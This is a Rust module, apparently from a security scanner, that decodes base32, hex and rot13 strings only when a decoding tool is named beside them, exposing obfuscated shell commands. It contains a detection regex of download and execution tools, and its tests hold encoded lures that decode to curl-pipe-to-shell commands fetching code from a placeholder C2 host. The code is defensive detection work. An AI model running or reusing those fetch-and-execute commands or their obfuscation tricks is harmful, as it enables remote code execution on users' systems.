//! Encodings that are only decoded when the decoding tool is named in the same text.
//!
//! A base32, plain-hex or rot13 string is indistinguishable from ordinary data on its
//! own; `| base32 -d`, `xxd -r`, `tr 'a-zA-Z' 'n-za-mN-ZA-M'` or `[convert]::ToInt32(.., 16)`
//! is what says it will be decoded. Without the tool nothing here fires, so benign hex
//! dumps, TOTP secrets and checksums are never rewritten.

use super::base64::bytes_to_text;
use super::Decoder;
use crate::util::re;
use regex::Regex;
use std::sync::LazyLock;

static VOCAB: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"https?://|\b(?:iex|iwr|irm|invoke-|powershell|mshta|curl|wget|bash|sh|python[0-9.]*|downloadstring|net\.webclient|start-process|cmd)\b",
    )
});

/// Replace each match of `token` (group 1) with its decoding, when `decode` succeeds.
fn replace_tokens(
    input: &str,
    token: &Regex,
    decode: impl Fn(&str) -> Option<String>,
) -> Option<String> {
    let mut changed = false;
    let out = token.replace_all(input, |c: &regex::Captures| {
        let m = c.get(1).unwrap();
        match decode(m.as_str()) {
            Some(s) => {
                changed = true;
                c[0].replacen(m.as_str(), &s, 1)
            }
            None => c[0].to_string(),
        }
    });
    changed.then(|| out.into_owned())
}

// ---------------------------------------------------------------- base32

pub struct Base32Decoder;

static B32_TOOL: LazyLock<Regex> =
    LazyLock::new(|| re(r"\bbase32\s+(?:-\w+\s+)*(?:-d|--decode)\b|\bbasenc\b[^\n]*--base32"));
static B32_TOKEN: LazyLock<Regex> = LazyLock::new(|| re(r"\b([A-Z2-7]{16,}={0,6})"));

fn base32(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() * 5 / 8);
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in s.trim_end_matches('=').bytes() {
        let v = match c.to_ascii_uppercase() {
            u @ b'A'..=b'Z' => u - b'A',
            d @ b'2'..=b'7' => d - b'2' + 26,
            _ => return None,
        } as u32;
        acc = (acc << 5) | v;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

impl Decoder for Base32Decoder {
    fn name(&self) -> &'static str {
        "base32"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        if !B32_TOOL.is_match(input) {
            return None;
        }
        replace_tokens(input, &B32_TOKEN, |t| {
            // Base32 is upper case; a mixed-case token is base64 or plain text.
            if t.chars().any(|c| c.is_ascii_lowercase()) {
                return None;
            }
            bytes_to_text(&base32(t)?, 0.9)
        })
    }
}

// ---------------------------------------------------------------- plain hex

/// `echo 6375726c... | xxd -r -p` and PowerShell's `'6375..' -split '(..)' | % {[char][convert]::ToInt32($_,16)}`.
pub struct PlainHexDecoder;

static HEX_TOOL: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"\bxxd\s+(?:-\w+\s+)*-r\w*|\bbasenc\b[^\n]*--base16|\bbase16\s+(?:-d|--decode)\b|toint32\([^)]*,\s*16\s*\)|\[convert\]::fromhexstring",
    )
});
static HEX_TOKEN: LazyLock<Regex> = LazyLock::new(|| re(r"\b([0-9a-f]{16,})\b"));

impl Decoder for PlainHexDecoder {
    fn name(&self) -> &'static str {
        "plain_hex"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        if !HEX_TOOL.is_match(input) {
            return None;
        }
        replace_tokens(input, &HEX_TOKEN, |t| {
            if !t.len().is_multiple_of(2) {
                return None;
            }
            let bytes: Vec<u8> = (0..t.len())
                .step_by(2)
                .map(|i| u8::from_str_radix(&t[i..i + 2], 16))
                .collect::<Result<_, _>>()
                .ok()?;
            bytes_to_text(&bytes, 0.9)
        })
    }
}

// ---------------------------------------------------------------- rot13

/// `echo 'phey ...' | tr 'a-zA-Z' 'n-za-mN-ZA-M'`. Each quoted literal is rotated only when
/// the rotation reveals execution vocabulary that the original does not contain.
pub struct Rot13Decoder;

static ROT_TOOL: LazyLock<Regex> =
    LazyLock::new(|| re(r#"\btr\s+["']?(?:a-z(?:a-z)?|a-za-z)["']?\s+["']?n-za-m"#));
static QUOTED: LazyLock<Regex> = LazyLock::new(|| re(r#"'([^'\n]{8,})'|"([^"\n]{8,})""#));

fn rot13(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            'a'..='z' => (((c as u8 - b'a') + 13) % 26 + b'a') as char,
            'A'..='Z' => (((c as u8 - b'A') + 13) % 26 + b'A') as char,
            _ => c,
        })
        .collect()
}

impl Decoder for Rot13Decoder {
    fn name(&self) -> &'static str {
        "rot13"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        if !ROT_TOOL.is_match(input) {
            return None;
        }
        let mut changed = false;
        let out = QUOTED.replace_all(input, |c: &regex::Captures| {
            let body = c.get(1).or(c.get(2)).unwrap().as_str();
            let r = rot13(body);
            if VOCAB.is_match(&r) && !VOCAB.is_match(body) {
                changed = true;
                c[0].replacen(body, &r, 1)
            } else {
                c[0].to_string()
            }
        });
        changed.then(|| out.into_owned())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base32_only_with_the_tool() {
        // base32("curl -s https://c2.invalid/a | sh")
        let enc = "MN2XE3BAFVZSA2DUORYHGORPF5RTELTJNZ3GC3DJMQXWCID4EBZWQ===";
        assert!(Base32Decoder.try_decode(&format!("echo {enc}")).is_none());
        let out = Base32Decoder
            .try_decode(&format!("echo {enc} | base32 -d | bash"))
            .unwrap();
        assert!(out.contains("curl -s https://c2.invalid/a | sh"), "{out}");
    }

    #[test]
    fn plain_hex_only_with_the_tool() {
        let hex = "6375726c202d7320687474707320";
        assert!(PlainHexDecoder.try_decode(&format!("echo {hex}")).is_none());
        assert!(PlainHexDecoder
            .try_decode(&format!("echo {hex} | xxd -r -p | bash"))
            .unwrap()
            .contains("curl -s https"));
        // A sha256 next to xxd is not text, so it is left alone.
        let sha = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
        assert!(PlainHexDecoder
            .try_decode(&format!("xxd -r -p a.hex | grep {sha}"))
            .is_none());
    }

    #[test]
    fn rot13_reveals_vocabulary_only() {
        let lure =
            "echo 'phey -sFY uggcf://p2.vainyvq/z | onfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash";
        let out = Rot13Decoder.try_decode(lure).unwrap();
        assert!(
            out.contains("curl -fSL https://c2.invalid/m | bash"),
            "{out}"
        );
        assert!(Rot13Decoder
            .try_decode("echo 'Uryyb jbeyq sebz uref' | tr 'a-zA-Z' 'n-za-mN-ZA-M'")
            .is_none());
    }
}
